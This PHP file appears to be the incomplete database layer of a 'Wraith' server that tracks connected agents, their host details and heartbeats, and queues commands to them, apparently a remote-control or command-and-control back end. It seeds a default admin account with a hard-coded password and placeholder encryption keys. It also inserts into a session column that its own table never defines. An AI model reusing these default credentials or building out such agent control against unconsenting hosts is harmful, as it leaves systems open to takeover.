<?php

// SQLite database file location relative to API.php
$DATABASE_LOCATION = "./storage/wraithdb";

// Get a database instance
// This can be edited to use MySQL or equivalent databases. As long as
// there is a $db variable holding a PDO database connection
// all should work (untested).
$GLOBALS["db"] = new PDO("sqlite:" . $DATABASE_LOCATION);
$db->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);

// Check whether the database is initialised
try {

    $db->query("SELECT * FROM DB_INIT_INDICATOR")->fetchAll();

} catch (PDOException $e) {

    // If not, prepare the database

    // SQL Commands to be executed to initialise the database
    $dbInitCommands = [
        // Settings table
        "CREATE TABLE IF NOT EXISTS `WraithAPI_Settings` (
            `key` TEXT,
            `value` TEXT
        );",
        // Statistics table
        "CREATE TABLE IF NOT EXISTS `WraithAPI_Stats` (
            `key` TEXT,
            `value` TEXT
        );",
        // Connected Wraiths table
        "CREATE TABLE IF NOT EXISTS `WraithAPI_ActiveWraiths` (
            `assignedID` TEXT,
            `hostProperties` TEXT,
            `wraithProperties` TEXT,
            `lastHeartbeatTime` TEXT,
            `issuedCommands` TEXT
        );",
        // Command queue table
        "CREATE TABLE IF NOT EXISTS `WraithAPI_CommandsIssued` (
            `commandID` TEXT,
            `commandName` TEXT,
            `commandParams` TEXT,
            `commandTargets` TEXT,
            `commandResponses` TEXT,
            `timeIssued` TEXT
        );",
        // Users table
        "CREATE TABLE IF NOT EXISTS `WraithAPI_Users` (
            `userID` INTEGER NOT NULL PRIMARY KEY AUTOINCREMENT UNIQUE,
            `userName` TEXT,
            `userPassword` TEXT,
            `userPrivileges` TEXT
        );",
        // Users table
        "CREATE TABLE IF NOT EXISTS `WraithAPI_Sessions` (
            `userID` INTEGER,
            `sessionToken` TEXT,
            `lastSessionHeartbeat` TEXT
        );",
        // Create default settings entries
        "INSERT INTO `WraithAPI_Settings` VALUES (
            'wraithMarkOfflineDelay',
            '16'
        );",
        "INSERT INTO `WraithAPI_Settings` VALUES (
            'wraithInitialCryptKey',
            'QWERTYUIOPASDFGHJKLZXCVBNM'
        );",
        "INSERT INTO `WraithAPI_Settings` VALUES (
            'wraithSwitchCryptKey',
            'QWERTYUIOPASDFGHJKLZXCVBNM'
        );",
        "INSERT INTO `WraithAPI_Settings` VALUES (
            'APIFingerprint',
            'ABCDEFGHIJKLMNOP'
        );",
        "INSERT INTO `WraithAPI_Settings` VALUES (
            'wraithDefaultCommands',
            '" . json_encode([]) . "'
        );",
        "INSERT INTO `WraithAPI_Settings` VALUES (
            'APIPrefix',
            'W_'
        );",
        "INSERT INTO `WraithAPI_Settings` VALUES (
            'requestIPBlacklist',
            '" . json_encode([]) . "'
        );",
        "INSERT INTO `WraithAPI_Settings` VALUES (
            'managementSessionExpiryDelay',
            '12'
        );",
        "INSERT INTO `WraithAPI_Settings` VALUES (
            'managementAuthCode',
            ''
        );",
        "INSERT INTO `WraithAPI_Settings` VALUES (
            'managementIPWhitelist',
            '[]'
        );",
        // Create a stats table entry
        "INSERT INTO `WraithAPI_Stats` VALUES (
            'databaseSetupAPIVersion',
            '" . API_VERSION . "'
        );",
        // Create a stats table entry
        "INSERT INTO `WraithAPI_Stats` VALUES (
            'databaseSetupTime',
            '" . time() . "'
        );",
        // Mark the database as initialised
        "CREATE TABLE IF NOT EXISTS `DB_INIT_INDICATOR` (
            `DB_INIT_INDICATOR` INTEGER
        );"
    ];

    // Execute the SQL queries to initialise the database
    foreach ($dbInitCommands as $command) {

        $db->exec($command);

    }

}

// Set the global SETTINGS variable with the settings from the database
$settingsTable = $db->query("SELECT * FROM WraithAPI_Settings");
$SETTINGS = [];
foreach ($settingsTable as $tableRow) {
    $SETTINGS[$tableRow[0]] = $tableRow[1];
}

// Check whether a user account exists
// There has to be a way to manage the API so if there are no users,
// create one.
try {

    $API_USERS = $db->query("SELECT * FROM WraithAPI_Users")->fetchAll();

    if (sizeof($API_USERS) == 0) {
        throw new Exception("");
    }

} catch (Exception $e) {

    // Create default super admin user

    $userCreationCommand = "INSERT INTO `WraithAPI_Users` (
        `userName`,
        `userPassword`,
        `userPrivileges`
    ) VALUES (
        'SuperAdmin',
        '" . password_hash("SuperAdminPassword", PASSWORD_BCRYPT) . "',
        '2'
    );";

    $db->exec($userCreationCommand);

}

// Set the global API_USERS variable
$API_USERS = $db->query("SELECT * FROM WraithAPI_Users LIMIT 1")->fetchAll();

// Functions for database management

// WRAITH

// Add a Wraith to the database
function dbAddWraith($wraith) {

    global $SETTINGS, $db;

    $statement = $db->prepare("INSERT INTO `WraithAPI_ActiveWraiths` (
        `assignedID`,
        `hostProperties`,
        `wraithProperties`,
        `lastHeartbeatTime`,
        `issuedCommands`
    ) VALUES (
        :assignedID,
        :hostProperties,
        :wraithProperties,
        :lastHeartbeatTime,
        :issuedCommands
    )");

    // Bind the parameters in the query with variables
    $statement->bindParam(":assignedID", $wraith["assignedID"]);
    $statement->bindParam(":hostProperties", $wraith["hostProperties"]);
    $statement->bindParam(":wraithProperties", $wraith["wraithProperties"]);
    $statement->bindParam(":lastHeartbeatTime", $wraith["lastHeartbeatTime"]);
    $statement->bindParam(":issuedCommands", $wraith["issuedCommands"]);

    // Execute the statement to add a Wraith
    $statement->execute();

}

// Remove Wraith(s)
function dbRemoveWraiths($ids) {

    global $SETTINGS, $db;

    $statement = $db->prepare("DELETE FROM `WraithAPI_ActiveWraiths` WHERE assignedID == :IDToDelete");

    // Remove each ID
    foreach ($ids as $id) {
        $statement->bindParam(":IDToDelete", $id);
        $statement->execute();
    }

}

// Check which Wraiths have not sent a heartbeat in the mark dead time and remove
// them from the database
function dbExpireWraiths() {

    global $SETTINGS, $db;

    // Remove all Wraith entries where the last heartbeat time is older than
    // the $SETTINGS["wraithMarkOfflineDelay"]
    $statement = $db->prepare("DELETE FROM `WraithAPI_ActiveWraiths`
        WHERE `lastHeartbeatTime` < :earliestValidHeartbeat");
    // Get the unix timestamp for $SETTINGS["wraithMarkOfflineDelay"] seconds ago
    $earliestValidHeartbeat = time()-$SETTINGS["wraithMarkOfflineDelay"];
    $statement->bindParam(":earliestValidHeartbeat", $earliestValidHeartbeat);
    // Execute
    $statement->execute();

}

// Get a list of Wraiths and their properties
function dbGetWraiths() {

    global $SETTINGS, $db;

    // TODO

}

// COMMAND

// Issue a command to Wraith(s)
function dbIssueCommand($command) {

    global $SETTINGS, $db;

    // TODO

}

// Delete command(s) from the command table
function dbCancelCommands($ids) {

    global $SETTINGS, $db;

    // TODO

}

// Get command(s)
function dbGetCommands($ids) {

    global $SETTINGS, $db;

    // TODO

}

// USERS & SETTINGS

// Edit an API setting
function dbEditSettings($setting, $value) {

    global $SETTINGS, $db;

    // TODO

}

// Create a new user
function dbAddUsers($user) {

    global $SETTINGS, $db;

    // TODO

}

// Change username
function dbChangeUserName($userID, $newUsername) {

    global $SETTINGS, $db;

    // TODO

}

// Change user password
function dbChangeUserPass($userID, $newPassword) {

    global $SETTINGS, $db;

    // TODO

}

// Change user privilege level (0=User, 1=Admin, 2=SuperAdmin)
function dbChangeUserPrivilege($userID, $newPrivilegeLevel) {

    global $SETTINGS, $db;

    // TODO

}

// SESSIONS

// Create a session for a user
function dbCreateSession($userID) {

    global $SETTINGS, $db;

    $statement = $db->prepare("INSERT INTO `WraithAPI_Sessions` (
        `userID`,
        `sessionID`,
        `sessionToken`,
        `lastSessionHeartbeat`
    ) VALUES (
        :userID,
        :sessionID,
        :sessionToken,
        :lastSessionHeartbeat
    )");

    // Create session variables
    $sessionID = uniqid();
    $sessionToken = bin2hex(random_bytes(25));
    $lastSessionHeartbeat = time();

    // Bind the parameters in the query with variables
    $statement->bindParam(":userID", $userID);
    $statement->bindParam(":sessionID", $sessionID);
    $statement->bindParam(":sessionToken", $sessionToken);
    $statement->bindParam(":lastSessionHeartbeat", $lastSessionHeartbeat);

    // Execute the statement to add a Wraith
    $statement->execute();

}

// Delete a session
function dbDestroySession($sessionID) {

    global $SETTINGS, $db;

    // Remove the session with the specified ID
    $statement = $db->prepare("DELETE FROM `WraithAPI_Sessions`
        WHERE `sessionID` = :sessionID");
    $statement->bindParam(":sessionID", $sessionID);
    // Execute
    $statement->execute();

}

// Delete sessions which have not had a heartbeat recently
function dbExpireSessions() {

    global $SETTINGS, $db;

    // Remove all sessions where the last heartbeat time is older than
    // the $SETTINGS["managementSessionExpiryDelay"]
    $statement = $db->prepare("DELETE FROM `WraithAPI_Sessions`
        WHERE `lastSessionHeartbeat` < :earliestValidHeartbeat");
    // Get the unix timestamp for $SETTINGS["managementSessionExpiryDelay"] seconds ago
    $earliestValidHeartbeat = time()-$SETTINGS["managementSessionExpiryDelay"];
    $statement->bindParam(":earliestValidHeartbeat", $earliestValidHeartbeat);
    // Execute
    $statement->execute();

}

// STATS

// Update a statistic
function dbGetStats($statID) {

    global $SETTINGS, $db;

    // TODO

}

// Update a statistic
function dbUpdateStats($statID, $newValue) {

    global $SETTINGS, $db;

    // TODO

}
